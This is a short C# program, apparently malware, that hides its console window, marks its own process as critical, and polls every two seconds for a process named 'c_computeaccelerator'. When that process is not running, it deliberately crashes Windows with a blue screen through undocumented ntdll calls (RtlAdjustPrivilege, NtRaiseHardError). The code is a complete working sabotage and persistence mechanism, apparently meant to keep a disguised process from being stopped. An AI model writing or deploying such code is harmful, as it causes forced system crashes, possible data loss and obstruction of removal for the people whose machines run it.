using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace Watch_Process
{
    class Program
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint RtlSetProcessIsCritical(bool bNewValue, ref bool pbOldValue, bool bNeedScb);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

        static void HideConsole()
        {
            IntPtr hWnd = GetConsoleWindow();
            if (hWnd != IntPtr.Zero)
                ShowWindow(hWnd, SW_HIDE);
        }

        static void MakeProcessCritical()
        {
            bool oldValue = false;
            RtlSetProcessIsCritical(true, ref oldValue, false);
        }

        static void TriggerBSOD()
        {
            bool prev;
            RtlAdjustPrivilege(19, true, false, out prev);
            uint resp;
            NtRaiseHardError(0xC000007B, 0, 0, IntPtr.Zero, 6, out resp); 
        }

        static bool IsProcessRunning(string name)
        {
            return Process.GetProcessesByName(name).Length > 0;
        }

        static void Main(string[] args)
        {
            HideConsole();
            MakeProcessCritical();

            string targetProcess = "c_computeaccelerator";

            while (true)
            {
                if (!IsProcessRunning(targetProcess))
                {
                    TriggerBSOD();
                }

                Thread.Sleep(2000);
            }
        }
    }
}
